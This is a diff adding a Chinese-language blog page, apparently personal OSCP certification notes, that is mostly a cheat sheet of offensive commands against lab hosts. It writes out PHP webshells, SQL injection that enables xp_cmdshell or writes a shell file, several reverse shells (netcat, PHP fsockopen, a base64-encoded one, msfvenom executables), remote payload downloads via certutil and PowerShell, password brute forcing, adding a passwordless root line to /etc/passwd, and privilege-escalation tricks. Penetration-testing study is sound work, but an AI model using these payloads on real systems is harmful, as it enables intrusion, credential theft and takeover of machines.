@@ -1,0 +1,894 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="Fazx">
+
+
+
+<meta name="description" content="‮">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OSCP NOTE (Cheatsheet)">
+<meta property="og:url" content="0sec.com.cn/2023-07-14/index.html">
+<meta property="og:site_name" content="Cosmic Fragments">
+<meta property="og:description" content="‮">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://0blog.test.upcdn.net/20231028174416.png">
+<meta property="og:image" content="http://0blog.test.upcdn.net/20231028174440.png">
+<meta property="og:image" content="http://0blog.test.upcdn.net/20231028174457.png">
+<meta property="og:image" content="http://0blog.test.upcdn.net/20231028174517.png">
+<meta property="og:updated_time" content="2023-10-28T09:50:06.452Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="OSCP NOTE (Cheatsheet)">
+<meta name="twitter:description" content="‮">
+<meta name="twitter:image" content="http://0blog.test.upcdn.net/20231028174416.png">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Cosmic Fragments" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>OSCP NOTE (Cheatsheet) | Cosmic Fragments</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?16b144395cc20d4a7b4ab64227601921";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Fazx</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">OSCP,OSWP,Security+,@Orange Cyberdefense,请使用HTTP访问本站以加载图片</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa 豆瓣" href="https://www.douban.com/people/faithandchange/" title="豆瓣"></a>
+                            
+                                <a class="fa 知乎" href="https://www.zhihu.com/people/ping2u" title="知乎"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/Fazx" title="GitHub"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                
+                
+
+                
+                
+                <section class="switch-part switch-part3">
+                
+                    <div id="js-aboutme">一个喜欢读和写的伪理科生。</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Fazx</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Fazx</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">OSCP,OSWP,Security+,@Orange Cyberdefense,请使用HTTP访问本站以加载图片</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa 豆瓣" target="_blank" href="https://www.douban.com/people/faithandchange/" title="豆瓣"></a>
+                            
+                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/ping2u" title="知乎"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/Fazx" title="GitHub"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-OSCP-NOTE-Cheatsheet" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023-07-14/" class="article-date">
+      <time datetime="2023-07-14T09:30:55.000Z" itemprop="datePublished">2023-07-14</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      OSCP NOTE (Cheatsheet)
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>‮<br><a id="more"></a></p>
+<ul>
+<li>初期卡住看WP，看一步继续自己做</li>
+<li>通关以后回看几个WP，看有没有新路子</li>
+<li>有些exp试试改一下带不带URL最后/</li>
+<li>有些端口连接要telnet和nc都试试</li>
+<li>考试搜WP：关键词hack the box / tryhackme / ProvingGrounds</li>
+<li>二进制程序先strings一下</li>
+<li>看目录ls -al -R，windows里dir/a或tree /f，别漏隐藏文件</li>
+<li>不明端口连上去输help试试</li>
+<li>有wordpress的站打进去记得看数据库密码/var/www/html/wp-config.php</li>
+</ul>
+<p>几个Payload页面：<br><a href="https://notchxor.github.io/oscp-notes/" target="_blank" rel="noopener">Hack The Planet</a><br><a href="https://www.heresecurity.wiki/about/readme" target="_blank" rel="noopener">Readme - PENETRATION NOTE</a><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" target="_blank" rel="noopener">swisskyrepo/PayloadsAllTheThings</a></p>
+<p>几个必备网站:<br><a href="https://book.hacktricks.xyz/welcome/readme" target="_blank" rel="noopener">HackTricks - HackTricks</a><br><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">Exploit Database</a><br><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a><br><a href="https://www.revshells.com/" target="_blank" rel="noopener">Online - Reverse Shell Generator</a><br><a name="751f0e8a"></a></p>
+<h2 id="侦察"><a href="#侦察" class="headerlink" title="侦察"></a>侦察</h2><p><a name="nmap"></a></p>
+<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><pre><code>nmap --script vuln 192.168.146.60
+nmap -sT -p- --min-rate 10000 10.129.138.220 
+
+udp扫描
+nmap -vvv -sU -o nmapudp 10.129.138.220 --max-retries 0
+或者
+nmap -sU --top-ports 10 -sV 10.129.228.106
+具体udp
+nmap -p 161,500 -sV -sU -sC 10.129.138.220
+</code></pre><p><a name="irGnH"></a></p>
+<h3 id="21-FTP"><a href="#21-FTP" class="headerlink" title="21 FTP"></a>21 FTP</h3><pre><code># 遍历下载
+wget -m --no-passive ftp://anonymous:anonymous@192.168.186.145
+wget -r -c -nH -np ftp://10.1.1.68/   --ftp-user=steph --ftp-password=billabong
+# 直接查看
+ftp&gt; more xxxx
+</code></pre><p><a name="048132fd"></a></p>
+<h3 id="80-扫目录"><a href="#80-扫目录" class="headerlink" title="80 扫目录"></a>80 扫目录</h3><pre><code>gobuster dir -u http://192.168.146.71:7331/ -w /usr/share/wordlists/dirb/big.txt -t 500
+gobuster dir -u http://192.168.146.54 -w /home/fazx/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
+
+dirsearch -u http://192.168.234.143/ -r -R 2 -x 404 -w /usr/share/wordlists/dirb/big.txt
+
+# new dict
+/cgi-bin/admin.cgi
+/api/heartbeat.php
+</code></pre><p><a name="FUZZ"></a></p>
+<h3 id="80-FUZZ-API"><a href="#80-FUZZ-API" class="headerlink" title="80 FUZZ, API"></a>80 FUZZ, API</h3><pre><code>wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 --hw 12 http://192.168.146.54/index.php?FUZZ=../location.txt
+
+{GOBUSTER}/v1
+{GOBUSTER}/v2
+gobuster dir -u http://192.168.250.143 -w /usr/share/wordlists/dirb/big.txt -p pattern
+</code></pre><p><a name="wpscan"></a></p>
+<h3 id="80-wpscan"><a href="#80-wpscan" class="headerlink" title="80 wpscan"></a>80 wpscan</h3><pre><code>wpscan --url http://literally.vulnerable:65535/phpcms/ -t 20 --enumerate vt,vp,u (--passwords passwords)
+</code></pre><p><a name="eCuNP"></a></p>
+<h3 id="80-hosts-cms"><a href="#80-hosts-cms" class="headerlink" title="80 hosts / cms"></a>80 hosts / cms</h3><pre><code>cmseek -u http://192.168.186.145/
+whatweb http://192.168.50.244
+
+echo &quot;192.168.146.65    literally.vulnerable&quot; &gt;&gt; /etc/hosts
+有些资源加载不了，看F12改了hosts才行
+</code></pre><p><a name="NDE07"></a></p>
+<h3 id="135-RPC"><a href="#135-RPC" class="headerlink" title="135 RPC"></a>135 RPC</h3><pre><code>rpcclient -U &quot;&quot; -N 192.168.186.145
+
+for i in $(seq 500 1100); do
+    rpcclient -N -U &quot;&quot; 192.168.186.145 -c &quot;queryuser 0x$(printf &#39;%x\n&#39; $i)&quot; | grep &quot;User Name\|user_rid\|group_rid&quot; &amp;&amp; echo &quot;&quot;;
+done
+</code></pre><p><a name="zzc48"></a></p>
+<h3 id="161-SNMP-udp"><a href="#161-SNMP-udp" class="headerlink" title="161 SNMP udp"></a>161 SNMP udp</h3><pre><code>snmp-check &quot;192.168.233.145&quot; -c public
+snmpwalk -c public -v1 192.168.210.149
+snmpbulkwalk -c public -v2c 10.10.11.136 .
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp
+</code></pre><p><a name="piCkS"></a></p>
+<h3 id="445-smb"><a href="#445-smb" class="headerlink" title="445 smb"></a>445 smb</h3><pre><code>crackmapexec smb 192.168.186.145
+crackmapexec smb 192.168.50.242 -u john -p &quot;dqsTwTpZPn#nL&quot; --shares
+crackmapexec smb ip -u &#39;anonymous&#39; -p &#39;anonymous&#39; --users
+
+smbclient -N -L //192.168.186.145
+smbclient -L //172.16.210.83/ -U medtech.com/wario --pw-nt-hash
+smbclient \\\\10.10.10.131\\ADMIN$ -U Administrator
+
+impacket-psexec -hashes 00000000000000000000000000000000:e728ecbadfb02f51ce8eed753f3ff3fd celia.almeda@10.10.140.142
+</code></pre><p><a name="aFsOL"></a></p>
+<h3 id="1433-MSSQL"><a href="#1433-MSSQL" class="headerlink" title="1433 MSSQL"></a>1433 MSSQL</h3><pre><code>crackmapexec mssql ip -u sa -p pass --local-auth -x &#39;whoami&#39;
+impacket-mssqlclient sql_svc:Dolphin1@10.10.100.148 -windows-auth
+sqsh -U sa -P poiuytrewq  -S 10.11.1.31:1433 
+
+a&#39;+or+&#39;a&#39;=&#39;a&#39;+;exec+master..xp_cmdshell+&#39;ping+192.168.119.169&#39;--
+
+EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;
+exec master..xp_cmdshell &#39;whoami&#39;
+</code></pre><p><a name="aA8bV"></a></p>
+<h3 id="3389-RDP"><a href="#3389-RDP" class="headerlink" title="3389 RDP"></a>3389 RDP</h3><p>连接</p>
+<pre><code>xfreerdp /u:test /p:123 /v:10.10.100.148 /cert:ignore -wallpaper /drive:kali,/root/Desktop/exp/temp
+
+# 配置文件
+/u:mac
+/p:IAmTheGOATSysAdmin!
+/v:192.168.126.221
+/cert:ignore
+/drive:kali,/root/Desktop/exp
+</code></pre><p>开启RDP</p>
+<pre><code>reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f
+net stop termservice &amp;&amp; net start termservice
+</code></pre><p><a name="ZuObs"></a></p>
+<h3 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h3><p>思路：可以读/etc/passwd看用户名，再去用户目录下读私钥/home/user/.ssh/id_rsa<br>argument name is like<strong> view, file, page, skin, theme, lang, template</strong>, file inclusion is highly possible </p>
+<pre><code>?page=php://filter/convert.base64-encode/resource=view.php
+</code></pre><p>windows LFI files<br><a href="https://notchxor.github.io/oscp-notes/4-win-privesc/15-LFI-FILES/" target="_blank" rel="noopener">https://notchxor.github.io/oscp-notes/4-win-privesc/15-LFI-FILES/</a><br><a name="a02b5db2"></a></p>
+<h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><p><a name="PY6Iu"></a></p>
+<h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><pre><code>/usr/share/dirb/wordlists/common.txt
+/usr/share/wfuzz/wordlist/others/common_pass.txt
+/usr/share/wordlists/rockyou.txt
+/usr/share/wordlists/dirb/big.txt
+/usr/share/wfuzz/wordlist/general/big.txt
+/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</code></pre><p><a name="QOxlt"></a></p>
+<h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><pre><code>hydra -l pinky -P /usr/share/dirb/wordlists/common.txt 192.168.146.54 -s 7654 http-post-form &#39;/login.php:user=^USER^&amp;pass=^PASS^:F=Invalid&#39;
+
+hydra -l admin -P /home/fazx/SecLists/Passwords/2020-200_most_used_passwords.txt &quot;ignition.htb&quot; http-post-form &quot;/admin:form_key=WaEWxk61HqTZyMVP&amp;login%5Busername%5D=admin&amp;login%5Bpassword%5D=^PASS^:please sign in&quot; -V
+
+hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.146.55 ssh
+
+hydra -L /usr/share/wordlists/chaoji/dic_username_ftp.txt -P /usr/share/wordlists/chaoji/dic_password_ftp.txt 192.168.146.80 ftp 
+
+hydra 192.168.146.60 -P /usr/share/wordlists/rockyou.txt http-post-form &#39;/kzMb5nVYJw/index.php:key=^PASS^:invalid&#39; -la（相当于用户名随便输入个a）
+
+hydra -l postgres -P /usr/share/wordlists/rockyou.txt 192.168.234.143 postgres
+</code></pre><p><a name="z8Uvj"></a></p>
+<h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><pre><code>wpscan --url http://127.0.0.1:1337/wordpress/ --wp-content-dir wp-content/ --proxy http://192.168.247.148:8080 --no-banner -U jerome -P /usr/share/wordlists/rockyou.txt
+
+wpscan --url http://192.168.50.244 --enumerate ap --plugins-detection aggressive
+</code></pre><p>aggressive模式可以扫出更多的插件, p是popular，vp vulnerable ，ap all<br><a name="JaKgP"></a></p>
+<h3 id="samba"><a href="#samba" class="headerlink" title="samba"></a>samba</h3><pre><code>枚举用户：
+enum4linux -U 192.168.3.142
+爆破密码
+./acccheck.pl -t 192.168.3.142 -u smb -v
+登陆查看
+smbclient //192.168.3.142/smb -U smb
+</code></pre><p><a name="bMQOH"></a></p>
+<h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><pre><code>fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt sitebackup3.zip -v
+
+zip2john sitebackup3.zip &gt; zip.hash
+john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt 
+</code></pre><p><a name="getshell"></a></p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p><a name="FNDMa"></a></p>
+<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><pre><code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;
+&lt;?php echo passthru($_GET[&#39;cmd&#39;]);
+</code></pre><p><a name="kQdON"></a></p>
+<h3 id="UNION注入写shell"><a href="#UNION注入写shell" class="headerlink" title="UNION注入写shell"></a>UNION注入写shell</h3><pre><code>1&#39; UNION SELECT 1,2,3,(&quot;&lt;?php echo passthru($_GET[&#39;cmd&#39;]);&quot;) INTO OUTFILE &#39;/var/www/html/tmp/123.php&#39;#
+</code></pre><p><a name="089073ed"></a></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p><a href="https://www.revshells.com/" target="_blank" rel="noopener">https://www.revshells.com/</a> <br>cme 执行powershell命令比较稳</p>
+<pre><code># busybox shell捡漏nc -e / nc-c
+busybox nc 192.168.146.55 8888 -e sh
+# php一句话反弹
+&lt;?php $sock = fsockopen(&quot;192.168.146.55&quot;,8888); $proc = proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock), $pipes); ?&gt;
+# windows reverse shell
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.68 LPORT=3306 -f exe &gt; evil.exe 
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.164 LPORT=21 -f exe &gt; 21.exe
+</code></pre><pre><code>php -r ‘$sock=fsockopen(“192.168.146.58”,8888);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’
+
+echo &quot;echo cGhwIC1yICckc29jaz1mc29ja29wZW4oIjE5Mi4xNjguMTQ2LjU4Iiw4ODg4KTtwb3BlbigiL2Jpbi9iYXNoIDwmMyA+JjMgMj4mMyIsICJyIik7Jw== | base64 -d&quot; &gt;&gt; ../write.sh
+
+echo &quot;php -r $sock=fsockopen(&quot;192.168.146.58&quot;,8888);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;&quot; &gt;&gt; write.sh
+
+?plot=;curl http://192.168.86.99/rshell443.txt --output rshell443.php
+
+nc 192.168.146.55 9999 | /bin/bash | nc 192.168.146.55 8888
+
+msfvenom -p windows/shell/reverse_tcp LHOST=192.168.45.234 LPORT=443 -f exe &gt; 443.exe
+</code></pre><p><a name="iYR7I"></a></p>
+<h3 id="socat完全交互式shell"><a href="#socat完全交互式shell" class="headerlink" title="socat完全交互式shell"></a>socat完全交互式shell</h3><pre><code>kali:   socat file:`tty`,raw,echo=0 tcp-listen:8888
+靶机:./socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:192.168.146.55:8888
+</code></pre><p><a name="dccd61c3"></a></p>
+<h3 id="python半交互式"><a href="#python半交互式" class="headerlink" title="python半交互式"></a>python半交互式</h3><pre><code>//半交互shell，在靶机执行
+python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; 
+python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; 
+</code></pre><p><a name="Q4E30"></a></p>
+<h3 id="stty升级完全交互式"><a href="#stty升级完全交互式" class="headerlink" title="stty升级完全交互式"></a>stty升级完全交互式</h3><pre><code>//完全交互式
+//Kali下装了GNOME的zsh终端会有问题，回车变成^M无法使用
+//所以先输入bash回归普通终端
+# In Kali
+$ bash
+
+# In reverse shell 
+$ python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; 
+Ctrl-Z
+
+# In Kali 
+$ stty raw -echo 
+$ fg 
+
+# In reverse shell 
+$ reset
+如果询问Terminal type?可以输入xterm-256color，虽然但是vi可能会看不到字
+所以一般就老实xterm或者dumb    (echo $TERM)
+</code></pre><p><a name="NnZcB"></a></p>
+<h2 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h2><p><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#ssh-keys-in-registry" target="_blank" rel="noopener">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#ssh-keys-in-registry</a><br><a href="https://benheater.com/thm-windows-privesc/" target="_blank" rel="noopener">https://benheater.com/thm-windows-privesc/</a><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</a><br><a href="https://zhuanlan.zhihu.com/p/428516577" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/428516577</a><br><a name="ktkk7"></a></p>
+<h3 id="先看权限"><a href="#先看权限" class="headerlink" title="先看权限"></a>先看权限</h3><pre><code>whoami /all
+</code></pre><p><a name="jJzfI"></a></p>
+<h3 id="SeImpersonatePrivilege"><a href="#SeImpersonatePrivilege" class="headerlink" title="SeImpersonatePrivilege"></a>SeImpersonatePrivilege</h3><pre><code>PrintSpoofer64.exe -i -c cmd.exe
+.\PrintSpoofer64.exe -i -c cmd.exe
+PrintSpoofer64.exe -i -c &quot;powershell.exe -e JABjAGwAa...&quot;
+certutil.exe -urlcache -split -f &quot;http://192.168.45.234/PrintSpoofer64.exe&quot;
+</code></pre><p><a name="q0yHF"></a></p>
+<h3 id="看服务"><a href="#看服务" class="headerlink" title="看服务"></a>看服务</h3><pre><code>certutil.exe -urlcache -split -f &quot;http://192.168.45.164/PowerUp.ps1&quot;
+powershell.exe -exec bypass -Command &quot;&amp; {Import-Module .\PowerUp.ps1; Invoke-AllChecks}&quot;
+powershell -exec bypass -Command &quot;Import-Module .\PowerUp.ps1;Invoke-AllChecks&quot;
+
+schtasks /query /fo LIST /v
+icacls &quot;%ProgramFiles%\RUXIM\PLUGscheduler.exe&quot;
+
+accesschk.exe /accepeula -uwcqv &quot;user&quot;
+</code></pre><p><a name="M7Aaq"></a></p>
+<h3 id="Service-unquoted-path"><a href="#Service-unquoted-path" class="headerlink" title="Service unquoted path"></a>Service unquoted path</h3><pre><code>powershell -ep bypass
+. .\PowerUp.ps1
+Get-UnquotedService
+Write-ServiceBinary -Name &#39;GammaService&#39; -Path &quot;C:\Program Files\Enterprise Apps\Current.exe&quot;  这个直接加用户了，方便  john/Password123!
+Restart-Service GammaService
+</code></pre><p><a name="Eobst"></a></p>
+<h3 id="看漏洞"><a href="#看漏洞" class="headerlink" title="看漏洞"></a>看漏洞</h3><p><a name="V6dMG"></a></p>
+<h3 id="Winpeas"><a href="#Winpeas" class="headerlink" title="Winpeas"></a>Winpeas</h3><pre><code>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile &quot;IEX(New-Object System.Net.WebClient).downloadFile(&#39;http://192.168.49.133/winPEASany.exe&#39;,&#39;c:\Users\rupert\Desktop\wp.exe&#39;)&quot;
+</code></pre><p><a name="e4vwt"></a></p>
+<h3 id="AlwaysInstallElevated-MSI-Abuse"><a href="#AlwaysInstallElevated-MSI-Abuse" class="headerlink" title="AlwaysInstallElevated MSI Abuse"></a>AlwaysInstallElevated MSI Abuse</h3><pre><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</code></pre><p>都为1时，普通用户执行MSI具有SYSTEM权限</p>
+<pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.79 LPORT=443 -f msi &gt; ~/Desktop/exp/shell443.msi
+直接执行msi就行，下面是静默安装命令
+msiexec /quiet /qn /i C:\Temp\setup.msi
+</code></pre><p><a name="K0Ljk"></a></p>
+<h3 id="手动找其他信息"><a href="#手动找其他信息" class="headerlink" title="手动找其他信息"></a>手动找其他信息</h3><pre><code>SauronEye.exe -d C:\Users\ --filetypes .txt .xml .conf .log --contents --keywords password
+type C:\Users\wario\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+# Windows autologin
+reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;
+
+# VNC
+reg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot;
+
+# SNMP Parameters
+reg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;
+
+# Putty
+reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;
+
+# Search for password in registry
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
+#查看ps的历史命令文件
+dir /s /b &quot;ConsoleHost_history.txt&quot;
+
+# ssh
+reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
+reg query &quot;HKCU\Software\OpenSSH\Agent\Key&quot;
+</code></pre><p><a name="e8ac8631"></a></p>
+<h2 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h2><p><a name="rCOgX"></a></p>
+<h3 id="LinPEAS"><a href="#LinPEAS" class="headerlink" title="LinPEAS"></a>LinPEAS</h3><pre><code>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+wget http://192.168.146.55/linpeas.sh
+</code></pre><p><a name="iL2zn"></a></p>
+<h3 id="Pspy"><a href="#Pspy" class="headerlink" title="Pspy"></a>Pspy</h3><pre><code># 持续监测进程，弥补linpeas
+wget https://hub.nuaa.cf/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
+</code></pre><p><a name="6aa4ba7e"></a></p>
+<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><pre><code>grep &quot;CRON&quot; /var/log/cron.log
+cat /etc/crontab
+</code></pre><p><a name="c5068b7c"></a></p>
+<h3 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h3><pre><code>openssl passwd evil
+echo &quot;root2:EyCPXNrY/E2XE:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd
+echo &quot;root4::0:0::/root:/bin/bash&quot; &gt;&gt; /etc/passwd
+不能通过ssh登录，只能从已有shell su过去
+</code></pre><p><img src="http://0blog.test.upcdn.net/20231028174416.png" alt><br><a name="SUID"></a></p>
+<h3 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h3><pre><code>#Find all SUID binaries
+find / -perm -u=s -type f 2&gt;/dev/null
+find / -user root -perm -4000 -print 2&gt;/dev/null
+(-perm 4000对应-rws)
+
+# (可能需要有当前用户密码，这个在/etc/sudoers里定义
+sudo -ll #Check commands you can execute with sudo
+//list user&#39;s privileges or check a specific command; use twice for longer format
+</code></pre><p><a href="https://tttang.com/archive/1793/" target="_blank" rel="noopener">https://tttang.com/archive/1793/</a><br><a name="VOMUi"></a></p>
+<h3 id="特殊文件"><a href="#特殊文件" class="headerlink" title="特殊文件"></a>特殊文件</h3><p>可能出现看不到的计划任务，需要猜测改文件</p>
+<pre><code># 查找对应用户的文件
+find / -user demon 2&gt;/dev/null | grep -Ev &#39;/proc|/sys|/user&#39;
+find / -user www-data -ls 2&gt;/dev/null | (grep -v proc)
+# 查可写文件
+find / -writable 2&gt;/dev/null | grep -v proc
+# 记得find -name是精确匹配
+find / -name *penguin*
+</code></pre><p><a name="searchsploit"></a></p>
+<h3 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h3><pre><code>grep PRETTY /etc/os-release
+searchsploit linux kernel ubuntu 16.04
+cp /usr/share/exploitdb/exploits/linux/local/45010.c ./
+gcc 45010.c –o 45010
+</code></pre><p><a name="AZv46"></a></p>
+<h3 id="覆盖环境变量提权"><a href="#覆盖环境变量提权" class="headerlink" title="覆盖环境变量提权"></a>覆盖环境变量提权</h3><pre><code>cd /tmp
+echo “/bin/sh” &gt; ls
+chmod +x ls
+echo $PATH
+export PATH=/tmp:$PATH
+cd /home/raj/script
+./shell
+whoami
+</code></pre><p><img src="http://0blog.test.upcdn.net/20231028174440.png" alt><br><a name="Pwnkit"></a></p>
